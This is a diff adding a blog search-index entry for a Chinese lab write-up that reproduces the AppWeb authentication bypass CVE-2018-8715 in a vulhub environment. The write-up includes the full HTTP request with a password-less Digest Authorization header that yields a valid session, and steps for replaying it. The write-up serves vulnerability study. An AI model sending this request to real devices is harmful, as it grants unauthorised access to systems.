@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>AppWeb 漏洞复现</title>
+      <link href="/posts/57611/"/>
+      <url>/posts/57611/</url>
+      
+        <content type="html"><![CDATA[<h3 id="AppWeb认证绕过漏洞（CVE-2018-8715）"><a href="#AppWeb认证绕过漏洞（CVE-2018-8715）" class="headerlink" title="AppWeb认证绕过漏洞（CVE-2018-8715）"></a>AppWeb认证绕过漏洞（CVE-2018-8715）</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C&#x2F;C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p><p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p><ul><li>basic 传统HTTP基础认证</li><li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li><li>form 表单认证</li></ul><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>Appweb 7.0.2及早期版本</p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p><img src="https://image.jh2ing.com/image-20220626194038634.png" alt="image-20220626194038634"></p><p>访问 <a href="http://your-ip:8080，需要输入账号密码。">http://your-ip:8080，需要输入账号密码。</a></p><p><img src="https://image.jh2ing.com/image-20220626194244114.png" alt="image-20220626194244114"></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>利用该漏洞需要知道一个已存在的用户名，当前环境下用户名为<code>admin</code>。</p><p>构造头<code>Authorization: Digest username=admin</code>，并发送如下数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Digest username=admin</span><br></pre></td></tr></table></figure><p>因为我们没有传入密码字段，所以服务端出现错误，直接返回了200，且包含一个session：</p><p>设置这个session到浏览器，即可正常访问需要认证的页面：</p><p><img src="https://image.jh2ing.com/image-20220626201043100.png" alt="image-20220626201043100"></p><p>或者直接在登录界面输入账号，然后抓取数据包</p><p><img src="https://image.jh2ing.com/image-20220626201800103.png" alt="image-20220626201800103"></p><p><strong>Authorization</strong>仅保留<code>Digest username=admin</code></p><p><img src="https://image.jh2ing.com/image-20220626201943185.png" alt="image-20220626201943185"></p><p>然后forward：</p><p><img src="https://image.jh2ing.com/image-20220626202035980.png" alt="image-20220626202035980"></p><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>打补丁或者直接升级到最新版</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vulhub </tag>
+            
+            <tag> AppWeb </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ActiveMQ漏洞复现</title>
       <link href="/posts/12315/"/>
       <url>/posts/12315/</url>
